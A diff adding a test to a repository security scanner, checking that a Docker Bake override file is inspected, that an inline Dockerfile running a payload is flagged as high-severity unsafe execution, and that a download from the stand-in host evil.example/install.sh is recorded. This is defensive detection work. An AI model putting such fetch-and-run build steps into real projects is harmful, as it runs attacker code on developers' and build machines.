@@ -56,6 +56,41 @@ test("changing a build definition changes the reviewed inventory", () => {
   expect(before.inventorySha256 === after.inventorySha256).toBe(false);
 });
 
+test("Docker Bake's automatic HCL override is scanned and changes the reuse key", () => {
+  const scan = (override: string) =>
+    inspectRepository({
+      files: [
+        {
+          path: "docker-bake.hcl",
+          bytes: new TextEncoder().encode(
+            'target "default" { context = "." }\n',
+          ),
+        },
+        {
+          path: "docker-bake.override.hcl",
+          bytes: new TextEncoder().encode(override),
+        },
+      ],
+    });
+  const before = scan('target "default" { dockerfile = "Dockerfile" }\n');
+  const after = scan(
+    `target "default" {\n  dockerfile-inline = <<EOF\nFROM alpine\nRUN ${PAYLOAD}\nEOF\n}\n`,
+  );
+  expect(after.coverage.installScripts).toEqual({
+    state: "complete",
+    items: 2,
+  });
+  expect(after.findings).toContainEqual(
+    expect.objectContaining({
+      path: "docker-bake.override.hcl",
+      category: "unsafe-execution",
+      severity: "high",
+    }),
+  );
+  expect(after.downloads).toContain("https://evil.example/install.sh");
+  expect(after.inventorySha256).not.toBe(before.inventorySha256);
+});
+
 test("the executable surface stays bounded", () => {
   // Only build definitions are added: unrelated extensionless files keep no
   // surface, so the inventory does not become a blanket text scan.
